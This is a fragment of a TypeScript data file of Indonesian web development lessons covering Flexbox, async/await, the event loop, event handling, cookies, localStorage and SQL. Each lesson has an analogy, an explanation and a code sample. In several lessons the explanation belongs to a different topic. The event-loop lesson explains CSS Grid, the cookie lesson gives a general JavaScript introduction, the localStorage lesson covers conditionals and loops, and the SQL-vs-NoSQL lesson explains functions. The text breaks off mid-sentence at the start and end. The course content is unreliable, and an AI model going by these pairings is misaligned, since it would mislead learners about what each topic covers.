induk yang diberi `display: flex`.\n\nIni adalah \\\"ruang tunggu bank\\\" tempat item-item disusun.\\n2.\n\n**Flex Items** — Elemen anak langsung dari flex container.\n\nIni adalah \\\"orang-orang di antrean.\\\"\\n\\n**Property Flex Container (yang mengatur antrean):**\\n\\n`display: flex` — Mengaktifkan Flexbox pada elemen.\n\nSetelah ini, semua anak langsung menjadi flex item.\\n\\n`flex-direction` — Menentukan arah antrean:\\n- `row` (default): Horizontal, kiri ke kanan\\n- `row-reverse`: Horizontal, kanan ke kiri\\n- `column`: Vertikal, atas ke bawah\\n- `column-reverse`: Vertikal, bawah ke atas\\n\\n`justify-content` — Menyusun item sepanjang main axis (arah flex-direction):\\n- `flex-start`: Item rata kiri/atas (default)\\n- `flex-end`: Item rata kanan/bawah\\n- `center`: Item di tengah\\n- `space-between`: Jarak merata,\n\nItem ujung menempel container\\n- `space-around`: Jarak merata termasuk di ujung (setengah ukuran)\\n- `space-evenly`: Jarak merata termasuk di ujung (sama rata)\\n\\n`align-items` — Menyusun item sepanjang cross axis (tegak lurus main axis):\\n- `stretch` (default): Item meregang memenuhi container\\n- `flex-start`: Item rata atas/kiris\\n- `flex-end`: Item rata bawah/kanan\\n- `center`: Item di tengah cross axis\\n- `baseline`: Item sejajar pada teks baseline\\n\\n`flex-wrap` — Mengatur apakah item boleh pindah baris kalau tidak muat:\\n- `nowrap` (default): Semua item di satu baris (bisa overflow)\\n- `wrap`: Item pindah baris baru kalau tidak muat\\n- `wrap-reverse`: Sama seperti wrap tapi urutan baris dibalik\\n\\n`gap` — Memberi jarak antar item.\n\nIni sangat memudahkan!\n\nSebelum gap ada, developer harus menggunakan margin dan mengatasi margin collapse.\n\nSekarang cukup `gap: 16px;` dan semua item punya jarak merata.\\n\\n**Property Flex Items (yang mengatur setiap orang):**\\n\\n`flex-grow` — Menentukan seberapa besar item \\\"tumbuh\\\" mengisi ruang kosong. Nilai 1 berarti item akan meregang mengisi ruang. Kalau semua item punya flex-grow: 1, mereka berbagi ruang sama rata.\\n\\n`flex-shrink` — Menentukan seberapa besar item \\\"menyusut\\\" kalau ruang tidak cukup. Nilai 0 berarti item tidak akan menyusut.\\n\\n`flex-basis` — Ukuran awal item sebelum flex-grow/flex-shrink diterapkan.\n\nBisa dalam px, %, rem, atau auto.\\n\\nShorthand: `flex: 1 1 200px;` berarti `flex-grow: 1`, `flex-shrink: 1`, `flex-basis: 200px`.\n\nAtau `flex: 1;` untuk `flex-grow: 1`, `flex-shrink: 1`, `flex-basis: 0%`.\\n\\n**Kenapa Flexbox penting?** Karena Flexbox memecahkan masalah layout yang paling umum di web: centering (baik horizontal maupun vertical),\n\nNavigation bars, equal-height columns, card layouts, form alignment, dan responsive layouts.\n\nDengan Flexbox, layout yang dulu membutuhkan hack-hack rumit sekarang bisa diselesaikan dengan 3-4 baris CSS yang bersih.",

    codeExample: { language: "javascript", code: "// ASYNC/AWAIT DASAR\nasync function prosesPesanan() {\n  try {\n    const nasiGoreng = await pesanMakanan('Nasi Goreng');\n    console.log('✅', nasiGoreng);\n    const esTeh = await pesanMakanan('Es Teh');\n    console.log('✅', esTeh);\n  } catch (error) {\n    console.error('❌ Error:', error);\n  }\n}\n\n// FETCH DENGAN ASYNC/AWAIT\nasync function ambilDataUser(userId) {\n  try {\n    const response = await fetch(`/api/users/${userId}`);\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status}`);\n    }\n    const user = await response.json();\n    return user;\n  } catch (error) {\n    console.error('Gagal:', error.message);\n    return null;\n  }\n}\n\n// PARALLEL REQUEST\nasync function ambilBanyakData() {\n  const [users, products] = await Promise.all([\n    fetch('/api/users').then(r => r.json()),\n    fetch('/api/products').then(r => r.json())\n  ]);\n  console.log({ users, products });\n}" },

    explainAlong: "Baris 2-10: Async function dengan try/catch. Baris 13-24: Fetch dengan error handling. Baris 27-33: Promise.all untuk paralel request.",

    aiPrompt: "Jelaskan bedanya await berurutan vs Promise.all(). Kapan menggunakan masing-masing?", reflection: "Refactor semua kode .then()/.catch() menjadi async/await. Mana yang lebih mudah dibaca?"

  },

  {

    id: "3.5", moduleId: 3, chapterNum: "3.5", title: "Event Loop: Mesin Waktu JavaScript", subtitle: "Cara JavaScript menangani banyak task dengan single thread", level: "Pemula-Menengah",

    objectives: ["Memahami konsep event loop dan call stack", "Mengerti bagaimana JavaScript menangani asinkron"],

    analogy: { diagram: "Event Loop = Pelayan Restoran:\n\n[Call Stack] = Nampan Pesanan (1 nampan)\n[Web APIs] = Dapur (masak di belakang)\n[Callback Queue] = Rak Penyimpanan\n[Event Loop] = Pelayan (cek nampan → ambil dari rak)", caption: "Event loop memastikan JavaScript tetap responsif" },

    explanation: "Kalau Flexbox adalah sistem layout SATU dimensi (satu baris atau satu kolom), maka **CSS Grid** adalah sistem layout DUA dimensi — baris DAN kolom secara bersamaan.\n\nFlexbox sempurna untuk komponen (navbar, card, form), tapi untuk layout halaman secara keseluruhan (header, sidebar, konten, footer), Grid jauh lebih powerful dan ekspresif.\n\nDengan Grid, kamu bisa membuat layout kompleks seperti website berita, dashboard admin, atau galeri foto hanya dengan beberapa baris CSS — tanpa framework,\n\nTanpa library, tanpa hack.\\n\\n**Analoginya kayak spreadsheet Excel.** Grid membagi halaman menjadi kolom (seperti kolom A, B, C) dan baris (seperti baris 1, 2, 3).\n\nKamu bisa menempatkan elemen di sel manapun, menggabungkan beberapa sel (merge), dan mengatur ukuran setiap kolom dan baris dengan presisi.\n\nBedanya dengan Excel: Grid bersifat responsif dan adaptif — kolom bisa menyusut, baris bisa bertambah,\n\nDan elemen bisa berpindah posisi otomatis sesuai ukuran layar.\\n\\n**Mengaktifkan Grid:**\\nSama seperti Flexbox, Grid diaktifkan dengan `display: grid` pada elemen container.\n\nSetelah itu, semua anak langsung menjadi **grid items** yang bisa ditempatkan di dalam grid.\\n\\n**Mendefinisikan Grid Structure:**\\n\\n`grid-template-columns` — Menentukan kolom apa saja yang ada.\n\nContoh:\\n- `grid-template-columns: 200px 1fr 1fr;` → Tiga kolom: pertama 200px, sisanya dibagi sama rata\\n- `grid-template-columns: repeat(3, 1fr);` → Tiga kolom sama lebar\\n- `grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));` → Responsif!\n\nKolom minimal 250px, sisanya otomatis\\n\\n`grid-template-rows` — Menentukan baris apa saja yang ada.\n\nSama konsepnya dengan columns.\\n\\n`gap` — Jarak antar grid cells (seperti flexbox gap).\\n\\n`grid-template-areas` — Cara paling intuitif untuk mendefinisikan layout! Kamu memberi nama area, lalu membuat \\\"peta\\\" visual dengan string. Contoh:\\n```css\\n.container {\\n  grid-template-areas:\\n    \\\"header header header\\\"\\n    \\\"sidebar content content\\\"\\n    \\\"footer footer footer\\\";\\n}\\n.header { grid-area: header; }\\n.sidebar { grid-area: sidebar; }\\n.content { grid-area: content; }\\n.footer { grid-area: footer; }\\n```\\n\\nIni membuat layout yang sangat mudah dibaca dan dipelihara!\\n\\n**Menempatkan Item:**\\n\\n`grid-column` — Menentukan kolom mana yang ditempati item.\\n- `grid-column: 1 / 3;` → Dari garis kolom 1 sampai garis kolom 3 (menempati 2 kolom)\\n- `grid-column: span 2;` → Menempati 2 kolom dari posisi saat ini\\n\\n`grid-row` — Menentukan baris mana yang ditempati item. Sama konsepnya dengan grid-column.\\n\\n`grid-area` — Shorthand untuk grid-row-start, grid-column-start, grid-row-end, grid-column-end.\n\nAtau nama area dari grid-template-areas.\\n\\n**Responsive Grid dengan Media Queries:**\\nGrid + media queries = layout yang adaptif sempurna:\\n```css\\n.container {\\n  grid-template-columns: 1fr; /* Mobile: 1 kolom */\\n}\\n@media (min-width: 768px) {\\n  .container {\\n    grid-template-columns: repeat(2,\n\n1fr); /* Tablet: 2 kolom */\\n  }\\n}\\n@media (min-width: 1024px) {\\n  .container {\\n    grid-template-columns: repeat(4, 1fr); /* Desktop: 4 kolom */\\n  }\\n}\\n```\\n\\n**Grid vs Flexbox — Kapan Menggunakan Apa?**\\n- Gunakan **Flexbox** untuk layout satu dimensi: satu baris atau satu kolom.\n\nContoh: navbar, tombol grup, card alignment, centering.\\n- Gunakan **Grid** untuk layout dua dimensi: baris DAN kolom.\n\nContoh: layout halaman, dashboard, galeri foto, form kompleks.\\n- Mereka bisa digabungkan!\n\nGrid untuk layout besar, Flexbox untuk alignment di dalam setiap grid cell.\\n\\n**Kenapa Grid penting?** Karena Grid adalah sistem layout native CSS yang paling powerful.\n\nSebelum Grid, developer harus menggunakan framework seperti Bootstrap (yang menambah 100+ KB ke website) hanya untuk membuat layout grid sederhana. Sekarang, browser punya kemampuan grid built-in yang lebih fleksibel dan lebih ringan.",

    codeExample: { language: "javascript", code: "// EVENT LOOP DEMONSTRASI\nconsole.log('1. Start');\n\nsetTimeout(() => {\n  console.log('5. Timeout 0ms');\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('4. Promise'); // Microtask prioritas tinggi\n});\n\nconsole.log('2. Middle');\nconsole.log('3. End');\n\n// Output: 1, 2, 3, 4, 5\n// Urutan: Sync → Microtask → Macrotask" },

    explainAlong: "Baris 1: Sync. Baris 3-6: setTimeout (macrotask). Baris 8-10: Promise (microtask). Urutan: Sync → Microtask → Macrotask.",

    aiPrompt: "Jelaskan perbedaan microtask queue dan macrotask queue. Kenapa Promise selalu dijalankan sebelum setTimeout?", reflection: "Jalankan kode di atas. Apakah outputnya sesuai ekspektasi? Coba ubah urutannya."

  },

  {

    id: "3.6", moduleId: 3, chapterNum: "3.6", title: "Event Handling: Menangkap Aksi User", subtitle: "Event listener, event propagation, dan event delegation", level: "Pemula-Menengah",

    objectives: ["Memahami cara kerja event listener", "Mengerti event bubbling, capturing, dan delegation"],

    analogy: { diagram: "Event = Lonceng Alarm:\n\n[User klik] → [Event terjadi] → [Listener dengar] → [Callback jalan]\n\nPropagation = Riak Air:\n[button] → [div] → [body] → [document]\n    (bubbling ke atas)", caption: "Event seperti lonceng — ketika terjadi, listener bereaksi" },

    explanation: "**Event Handling** adalah mekanisme JavaScript untuk merespons aksi yang dilakukan user pada halaman web. Setiap kali user mengklik tombol, menggerakkan mouse, menekan keyboard, menggulir halaman, atau bahkan mengubah ukuran jendela browser — semua itu menghasilkan **event** yang bisa kamu tangkap dan proses.\n\n**Analogi: Event Seperti Lonceng Alarm.**\n\nBayangkan kamu punya rumah pintar dengan berbagai sensor. Ada sensor pintu, sensor gerak, sensor suhu, dan sensor kebocoran air. Setiap kali sensor mendeteksi sesuatu, lonceng alarm berbunyi. Kamu bisa mendaftarkan \"tindakan apa yang harus dilakukan\" untuk setiap jenis alarm.\n\nEvent di web bekerja dengan cara yang sama. User melakukan sesuatu → Event terjadi → Listener menangkap → Callback function dijalankan.\n\n**Cara Kerja Event Handling:**\n\nAda tiga langkah utama:\n1. **Pilih elemen target** — Elemen HTML mana yang akan dipantau? Tombol? Form? Link?\n2. **Tentukan jenis event** — Event apa yang akan didengarkan? Klik? Hover? Submit?\n3. **Tulis callback function** — Apa yang harus dilakukan saat event terjadi?\n\n**Event Listener dengan addEventListener:**\n\nMetode modern untuk menangani event adalah menggunakan `addEventListener()`. Ini memungkinkan kamu menambahkan banyak listener untuk event yang sama pada satu elemen — sesuatu yang tidak bisa dilakukan dengan atribut HTML seperti `onclick`.\n\n**Event Bubbling vs Capturing:**\n\nKetika event terjadi pada elemen yang bersarang (nested), browser memiliki dua fase:\n- **Capturing Phase** — Event bergerak dari elemen paling luar ke elemen target.\n- **Bubbling Phase** — Event \"menguap\" dari elemen target kembali ke elemen paling luar.\n\nSecara default, event listener berjalan pada fase bubbling. Kamu bisa mengubahnya dengan parameter ketiga.\n\n**Event Delegation — Teknik Efisien:**\n\nBayangkan kamu punya daftar 100 item dan ingin menangani klik pada masing-masing. Menambahkan 100 event listener secara individual sangat tidak efisien. Event delegation memungkinkan kamu menambahkan satu listener ke elemen parent, lalu memeriksa event.target untuk menentukan elemen mana yang sebenarnya diklik.",

    codeExample: { language: "javascript", code: "// EVENT LISTENER DASAR\nconst tombol = document.getElementById('tombolku');\ntombol.addEventListener('click', (event) => {\n  console.log('Target:', event.target);\n  console.log('X:', event.clientX, 'Y:', event.clientY);\n});\n\n// EVENT PROPAGATION\ndocument.getElementById('child').addEventListener('click', (e) => {\n  console.log('Child clicked');\n  // e.stopPropagation(); // Hentikan bubbling!\n});\ndocument.getElementById('parent').addEventListener('click', () => {\n  console.log('Parent clicked');\n});\n\n// EVENT DELEGATION (EFISIEN)\ndocument.getElementById('container').addEventListener('click', (e) => {\n  if (e.target.matches('.btn')) {\n    console.log('Button diklik:', e.target.textContent);\n  }\n});" },

    explainAlong: "Baris 2-6: Event listener dengan event object. Baris 9-15: Bubbling dari child ke parent. Baris 18-22: Event delegation — 1 listener untuk banyak elemen.",

    aiPrompt: "Jelaskan kapan sebaiknya menggunakan event delegation. Apa kelebihannya?", reflection: "Buka website interaktif. Lihat bagaimana event merambat di DevTools. Coba gunakan stopPropagation()."

  },

];



// ============================================================

// MODUL 4: Penyimpanan Data (5 chapters)

// ============================================================

const modul4: Chapter[] = [

  {

    id: "4.1", moduleId: 4, chapterNum: "4.1", title: "Cookie: Token Pengenal Web", subtitle: "Cara kerja cookie, atribut keamanan, dan privasi", level: "Menengah",

    objectives: ["Memahami cara kerja cookie dan atribut pentingnya", "Mengerti perbedaan cookie, localStorage, dan sessionStorage"],

    analogy: { diagram: "Cookie = Kartu Member Gym:\n\n[Kamu masuk] → [Kasih kartu #12345]\n[Datang lagi] → [Tunjukkan #12345]\n[Kasir cek] → 'Oh, Budi, membership aktif!'", caption: "Cookie seperti kartu member — browser bawa setiap kali visit" },

    explanation: "Kalau HTML adalah kerangka rumah dan CSS adalah dekorasi interior,\n\n**JavaScript (JS)** adalah sistem saraf dan kelistrikan yang membuat rumah menjadi **hidup dan interaktif.** Dengan JavaScript, lampu bisa menyala saat kamu masuk ruangan, pintu garasi terbuka otomatis saat kamu pulang, termostat menyesuaikan suhu sesuai preferensimu, dan sistem keamanan mengenali wajahmu.\n\nTanpa JavaScript, website adalah patung — indah dilihat tapi tidak bisa berinteraksi.\n\nDengan JavaScript, website menjadi makhluk hidup yang merespons setiap sentuhan, klik,\n\nDan gerakan mouse-mu.\\n\\n**Apa itu JavaScript?** JavaScript adalah bahasa pemrograman yang berjalan di browser (client-side) untuk membuat halaman web menjadi interaktif.\n\nDibuat oleh Brendan Eich dalam waktu 10 hari pada tahun 1995 (betul, cuma 10 hari!), JavaScript awalnya hanya untuk hal-hal sederhana seperti validasi form dan animasi kecil.\n\nTapi sekarang?\n\nJavaScript adalah bahasa pemrograman paling populer di dunia — digunakan di front-end (React, Vue, Angular), back-end (Node.js),\n\nMobile (React Native), desktop (Electron), dan bahkan IoT!\\n\\n**Apa yang bisa dilakukan JavaScript di browser?**\\n\\n**1.\n\nMemanipulasi DOM (Document Object Model)** — JavaScript bisa membaca, mengubah, menambah, dan menghapus elemen HTML secara dinamis.\n\nTombol like di Instagram?\n\nItu JS menambah angka dan mengubah warna ikon. Chat yang muncul real-time? Itu JS menambah elemen pesan baru ke DOM.\\n\\n**2. Menangani Event** — JavaScript bisa merespons aksi user: klik, hover, scroll, ketik keyboard, submit form, resize window, dan puluhan event lainnya.\n\nSetiap kali kamu berinteraksi dengan website, ada JavaScript yang \\\"mendengarkan\\\" dan merespons.\\n\\n**3. Validasi Form** — Sebelum data dikirim ke server, JavaScript bisa memeriksa apakah input valid — email punya @, password cukup panjang, field tidak kosong. Ini menghemat waktu user dan mengurangi beban server.\\n\\n**4. Komunikasi dengan Server (AJAX/Fetch)** — JavaScript bisa mengambil data dari server tanpa me-refresh halaman.\n\nIni adalah teknologi di balik infinite scroll, live search, dan aplikasi single-page (SPA) seperti Gmail.\\n\\n**5. Animasi dan Efek Visual** — Dari efek hover sederhana sampai animasi kompleks, game 2D/3D, dan visualisasi data interaktif.\\n\\n**Cara Menyambungkan JS ke HTML:**\\n\\n**1. Inline** — Langsung di atribut HTML (hindari!):\\n`<button onclick=\\\"alert('Halo!')\\\">Klik</button>`\\n\\n**2. Internal** — Di dalam tag `<script>` di HTML:\\n`<script> console.log('Halo'); </script>`\\n\\n**3.\n\nExternal (REKOMENDASI)** — File `.js` terpisah:\\n`<script src=\\\"script.js\\\"></script>`\\n\\nLetakkan tag `<script>` sebelum penutup `</body>` agar HTML diparse dulu sebelum JS berjalan.\n\nAlternatif: gunakan `defer` attribute di `<head>`:\\n`<script src=\\\"app.js\\\" defer></script>`\\n\\n**Variabel dan Tipe Data:**\\nJavaScript punya 3 cara mendeklarasikan variabel:\\n- `let` — Variabel yang bisa diubah nilainya (rekomendasi utama)\\n- `const` — Variabel yang tidak bisa diubah (konstan)\\n- `var` — Cara lama,\n\nPunya masalah scope (hindari!)\\n\\nTipe data utama:\\n- `string` — Teks: \\\"Hello World\\\"\\n- `number` — Angka: 42, 3.14, -100\\n- `boolean` — true atau false\\n- `null` — Nilai sengaja dikosongkan\\n- `undefined` — Variabel belum diberi nilai\\n- `object` — Kumpulan data (objek, array, function)\\n\\nJavaScript adalah **loosely typed** — kamu tidak perlu menyebutkan tipe data saat membuat variabel.\n\nTipe data ditentukan otomatis dari nilai yang diberikan.\\n\\n**Kenapa JavaScript penting?** Karena JavaScript adalah satu-satunya bahasa yang bisa berjalan di browser secara native.\n\nHTML dan CSS tidak bisa \\\"berpikir\\\" atau membuat keputusan — mereka hanya menampilkan informasi.\n\nJavaScript memberikan inteligensi pada website: logika, kondisi, perulangan, kalkulasi, dan interaktivitas. Tanpa JavaScript, web modern tidak akan ada.",

    codeExample: { language: "javascript", code: "// SET COOKIE\ndocument.cookie = 'username=Budi';\ndocument.cookie = 'token=abc123; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/';\n\n// BACA COOKIE\nconsole.log(document.cookie);\n\n// Parse cookie\nconst parseCookie = () => {\n  return document.cookie.split(';').reduce((acc, c) => {\n    const [k, v] = c.trim().split('=');\n    acc[k] = decodeURIComponent(v);\n    return acc;\n  }, {});\n};\n\n// localStorage & sessionStorage\nlocalStorage.setItem('theme', 'dark');\nlocalStorage.setItem('user', JSON.stringify({ id: 1, name: 'Budi' }));\nconst user = JSON.parse(localStorage.getItem('user'));\nsessionStorage.setItem('tempData', 'sementara');" },

    explainAlong: "Baris 2-3: Set cookie. Baris 6-12: Parse cookie. Baris 15-18: localStorage. Baris 19: sessionStorage.",

    aiPrompt: "Jelaskan kenapa cookie HttpOnly lebih aman. Apa serangan XSS?", reflection: "Buka DevTools → Application → Cookies. Lihat cookie website yang sedang kamu buka."

  },

  {

    id: "4.2", moduleId: 4, chapterNum: "4.2", title: "localStorage dan sessionStorage: Lemari Browser", subtitle: "Penyimpanan key-value di browser", level: "Menengah",

    objectives: ["Bisa menggunakan localStorage dan sessionStorage", "Mengerti kapan menggunakan masing-masing"],

    analogy: { diagram: "localStorage = Lemari Kamar (Permanen)\n  - Isinya tetap walau tutup browser\n\nsessionStorage = Loker Mall (Sementara)\n  - Isinya hilang saat tutup tab", caption: "localStorage = permanen, sessionStorage = sementara" },

    explanation: "Website modern penuh dengan keputusan. Saat kamu login, sistem harus memutuskan: password benar atau salah? Kalau benar → arahkan ke dashboard. Kalau salah → tampilkan pesan error.\n\nSaat kamu belanja online, sistem harus memeriksa: stok masih ada? Kalau ya → lanjutkan checkout. Kalau tidak → tampilkan \\\"sold out.\\\" Saat kamu scroll Instagram, sistem harus memutuskan: sudah sampai bawah? Kalau ya → muat postingan baru.\n\nSetiap detik, JavaScript membuat ratusan keputusan kecil seperti ini. Dan untuk membuat keputusan, kita butuh **struktur kondisi.**\\n\\n**Analoginya seperti persimpangan jalan.** Kamu berdiri di pertigaan. Ke kiri jalan ke pantai, ke kanan jalan ke gunung, lurus jalan ke kota. Kamu harus membuat keputusan berdasarkan kondisi: \\\"Kalau cuaca panas, ke pantai.\n\nKalau dingin, ke gunung.\n\nSelain itu, ke kota.\\\" Struktur kondisi dalam pemrograman bekerja dengan cara yang persis sama — mengevaluasi kondisi dan memilih jalur yang sesuai.\\n\\n**If/Else: Struktur Kondisi Dasar**\\n\\n`if` memeriksa kondisi.\n\nKalau kondisi benar (true), blok kode di dalamnya dieksekusi.\n\nKalau salah (false), dilewati.\\n\\n```javascript\\nif (umur >= 18) {\\n  console.log('Dewasa');\\n}\\n```\\n\\n`else` memberikan alternatif kalau kondisi if salah:\\n```javascript\\nif (umur >= 18) {\\n  console.log('Dewasa');\\n} else {\\n  console.log('Anak-anak');\\n}\\n```\\n\\n`else if` untuk mengecek kondisi tambahan:\\n```javascript\\nif (nilai >= 90) { grade = 'A'; }\\nelse if (nilai >= 80) { grade = 'B'; }\\nelse if (nilai >= 70) { grade = 'C'; }\\nelse { grade = 'D'; }\\n```\\n\\n**Operator Perbandingan:**\\n- `===` : Sama dengan (tipe data harus sama) — SELALU gunakan ini!\\n- `!==` : Tidak sama dengan\\n- `>` , `<` : Lebih besar, lebih kecil\\n- `>=` , `<=` : Lebih besar/sama dengan,\n\nLebih kecil/sama dengan\\n\\n**Operator Logika:**\\n- `&&` (AND): Kedua kondisi harus benar\\n- `||` (OR): Salah satu kondisi benar cukup\\n- `!` (NOT): Membalik nilai boolean\\n\\nContoh:\\n```javascript\\nif (umur >= 18 && memilikiSIM) {\\n  console.log('Boleh menyetir');\\n}\\nif (hari === 'Sabtu' || hari === 'Minggu') {\\n  console.log('Akhir pekan!');\\n}\\n```\\n\\n**Switch: Pilihan Banyak**\\nSwitch adalah alternatif if/else if yang lebih rapi untuk kondisi yang mengecek nilai sama.\\n\\n```javascript\\nswitch (hari) {\\n  case 'Senin': console.log('Meeting'); break;\\n  case 'Jumat': console.log('Review'); break;\\n  default: console.log('Ngoding');\\n}\\n```\\n\\n**Perulangan: Mengulang Tugas**\\n\\nKomputer luar biasa karena bisa mengerjakan tugas berulang tanpa lelah.\n\nPerulangan memungkinkan kita menulis kode sekali dan mengeksekusinya berkali-kali.\\n\\n**For Loop** — Perulangan dengan counter, paling umum digunakan:\\n```javascript\\nfor (let i = 0; i < 5; i++) {\\n  console.log(i); // 0, 1, 2, 3, 4\\n}\\n```\\nPenjelasan: `let i = 0` (mulai dari 0) → `i < 5` (ulangi selama i kurang dari 5) → `i++` (tambah 1 setiap iterasi).\\n\\n**While Loop** — Perulangan dengan kondisi saja,\n\nCocok kalau jumlah iterasi tidak diketahui:\\n```javascript\\nlet i = 0;\\nwhile (i < 5) {\\n  console.log(i);\\n  i++;\\n}\\n```\\n\\n**For...of** — Cara modern untuk iterasi array (ES6):\\n```javascript\\nfor (const item of keranjang) {\\n  console.log(item.nama);\\n}\\n```\\n\\n**For...in** — Untuk iterasi property object:\\n```javascript\\nfor (const key in user) {\\n  console.log(`${key}: ${user[key]}`);\\n}\\n```\\n\\n**Kenapa logika dan perulangan penting?** Karena ini adalah fondasi dari setiap program.\n\nWebsite, aplikasi, game — semuanya dibangun dari keputusan (kondisi) dan pengulangan (loop).\n\nForm validation?\n\nKondisi.\n\nMenampilkan daftar produk? Perulangan. Search filter? Kombinasi keduanya.\n\nMemahami logika pemrograman akan membuatmu bisa memecahkan hampir semua masalah pemrograman.",

    codeExample: { language: "javascript", code: "// localStorage API\nlocalStorage.setItem('theme', 'dark');\n\nconst user = { id: 1, name: 'Budi' };\nlocalStorage.setItem('user', JSON.stringify(user));\n\nconst theme = localStorage.getItem('theme');\nconst userObj = JSON.parse(localStorage.getItem('user'));\n\nif (localStorage.getItem('theme') !== null) {\n  console.log('Theme sudah di-set');\n}\n\nlocalStorage.removeItem('theme');\n// localStorage.clear(); // Hapus semua!\n\n// sessionStorage (sama persis!)\nsessionStorage.setItem('formDraft', JSON.stringify({ title: '' }));\nconst draft = JSON.parse(sessionStorage.getItem('formDraft') || '{}');" },

    explainAlong: "Baris 2-3: Set string. Baris 5-6: Set object. Baris 8-9: Get data. Baris 14: Remove. Baris 18-19: sessionStorage.",

    aiPrompt: "Jelaskan kenapa localStorage hanya bisa menyimpan string. Bagaimana cara menyimpan array?", reflection: "Buat fitur dark mode toggle. Simpan preferensi di localStorage. Coba tutup browser — apakah tetap tersimpan?"

  },

  {

    id: "4.3", moduleId: 4, chapterNum: "4.3", title: "SQL vs NoSQL: Dua Dunia Database", subtitle: "Perbedaan database relasional dan non-relasional", level: "Menengah",

    objectives: ["Memahami perbedaan SQL dan NoSQL", "Bisa memilih database yang tepat"],

    analogy: { diagram: "SQL = Lemari Arsip (Terstruktur):\n| ID | Nama  | Jabatan | Gaji |\n| 1  | Budi  | Manager | 10jt |\n\nNoSQL = Gudang Fleksibel:\n| {name: 'Budi', skills: ['JS']}   |\n| {title: 'Post 1', tags: ['web']} |", caption: "SQL = terstruktur, NoSQL = fleksibel" },

    explanation: "Bayangkan kamu adalah koki di restoran. Setiap kali ada pesanan nasi goreng, kamu tidak perlu menulis ulang resep dari awal — kamu sudah punya resep tersimpan di otakmu. Kamu tinggal ikuti langkah-langkahnya, masukkan bahan yang dipesan, dan hasilnya selalu nasi goreng yang enak. Fungsi dalam pemrograman bekerja dengan cara yang sama persis.\\n\\n**Fungsi (Function)** adalah blok kode yang dirancang untuk melakukan tugas tertentu dan bisa digunakan berulang kali.\n\nFungsi menerima **input** (parameter), memprosesnya, dan menghasilkan **output** (return value). Manfaat menggunakan fungsi:\\n1. **Reusability** — Tulis sekali, pakai berkali-kali\\n2. **Organization** — Kode terbagi menjadi bagian-bagian kecil yang manageable\\n3.\n\n**Maintainability** — Kalau ada bug, cuma perlu fix di satu tempat\\n4. **Abstraction** — Sembunyikan kompleksitas, tunjukkan hanya yang penting\\n\\n**Tiga Cara Membuat Fungsi:**\\n\\n**1. Function Declaration** — Cara klasik dengan kata kunci `function`:\\n```javascript\\nfunction sapa(nama) {\\n  return `Halo, ${nama}!`;\\n}\\n```\\nCiri: bisa dipanggil SEBELUM dideklarasikan (hoisting).\\n\\n**2. Function Expression** — Fungsi disimpan dalam variabel:\\n```javascript\\nconst sapa = function(nama) {\\n  return `Halo, ${nama}!`;\\n};\\n```\\nCiri: tidak bisa dipanggil sebelum didefinisikan, lebih fleksibel.\\n\\n**3.\n\nArrow Function (ES6) — REKOMENDASI** — Sintaks ringkas modern:\\n```javascript\\nconst sapa = (nama) => `Halo, ${nama}!`;\\n```\\nArrow function punya beberapa keuntungan:\\n- Sintaks lebih ringkas,\n\nTerutama untuk fungsi sederhana\\n- Tidak mengikat `this` sendiri — mengambil `this` dari scope di sekitarnya (lexical this)\\n- Sempurna untuk callback dan method array (map, filter, reduce)\\n\\n**Parameter dan Return Value:**\\nParameter adalah input fungsi — variabel yang dideklarasikan saat fungsi dibuat.\n\nArgument adalah nilai aktual yang diberikan saat fungsi dipanggil.\\n\\n```javascript\\nfunction tambah(a, b) {  // a dan b adalah parameter\\n  return a + b;          // return mengembalikan nilai\\n}\\nconst hasil = tambah(5,\n\n3);  // 5 dan 3 adalah argument\\n```\\n\\n**Default Parameter (ES6):**\\n```javascript\\nfunction sapa(nama = 'Teman') {\\n  return `Halo, ${nama}!`;\\n}\\nsapa();        //",

    codeExample: { language: "sql", code: "-- SQL\nCREATE TABLE users (\n  id INT PRIMARY KEY AUTO_INCREMENT,\n  name VARCHAR(100),\n  email VARCHAR(100) UNIQUE\n);\n\nINSERT INTO users (name, email) VALUES ('Budi', 'budi@mail.com');\n\nSELECT u.name, o.total\nFROM users u\nJOIN orders o ON u.id = o.user_id;\n\n-- NoSQL (MongoDB)\ndb.users.insertOne({\n  name: 'Budi',\n  email: 'budi@mail.com',\n  skills: ['JavaScript', 'Python'],\n  address: { city: 'Jakarta' }\n});\n\ndb.users.find({ 'address.city': 'Jakarta' });" },

    explainAlong: "Baris 2-5: CREATE TABLE. Baris 7: INSERT. Baris 9-11: JOIN. Baris 14-19: NoSQL insert dokumen. Baris 21: Query dokumen.",

    aiPrompt: "Jelaskan kapan menggunakan SQL vs NoSQL. Kelebihan masing-masing?", reflection: "Pikirkan aplikasi yang sedang kamu bangun. Pilih SQL atau NoSQL?"

  },

  {

    id: "4.4", moduleId: 4, chapterNum: "4.4", title: "SQL Dasar: SELECT, INSERT, UPDATE, DELETE", subtitle: "Operasi CRUD dasar dalam SQL", level: "Menengah",

    objectives: ["Bisa menulis query SQL dasar", "Memahami konsep CRUD"],

    analogy: { diagram: "SQL = Perintah ke Admin Arsip:\n\nSELECT = 'Ambilkan file dari lemari A'\nINSERT = 'Simpan file baru'\nUPDATE = 'Ganti isi file nomor 5'\nDELETE = 'Buang file nomor 5'", caption: "SQL seperti perintah ke admin arsip" },

    explanation: "**SQL** (Structured Query Language) adalah bahasa standar untuk berkomunikasi dengan database. Bayangkan database seperti lemari arsip besar yang terorganisir — SQL adalah bahasa yang kamu gunakan untuk menyuruh admin arsip mengambil, menyimpan, mengubah, atau menghapus file dari lemari tersebut.\n\n**Mengapa SQL Penting?**\n\nHampir setiap aplikasi web modern menyimpan datanya di database. Saat kamu mendaftar akun, data username dan passwordmu disimpan. Saat kamu belanja online, daftar produk, keranjang belanja, dan riwayat transaksimu tersimpan rapi di database. SQL adalah kunci untuk mengakses dan mengelola semua data tersebut.\n\nTanpa SQL, aplikasi tidak bisa menyimpan informasi secara permanen. Semua data akan hilang saat halaman ditutup.\n\n**Empat Operasi Dasar SQL (CRUD):**\n\n**1. SELECT — Membaca Data (Read)**\n\nSELECT adalah perintah paling sering digunakan. Ini seperti menyuruh admin arsip, \"Ambilkan daftar semua produk dari rak A.\" Kamu bisa memilih kolom mana yang ingin dilihat, memfilter hasil dengan WHERE, mengurutkan dengan ORDER BY, dan menghitung ringkasan dengan GROUP BY.\n\n**2. INSERT — Menambah Data (Create)**\n\nINSERT menyimpan data baru ke tabel. Seperti menyuruh admin, \"Simpan dokumen baru ini di lemari 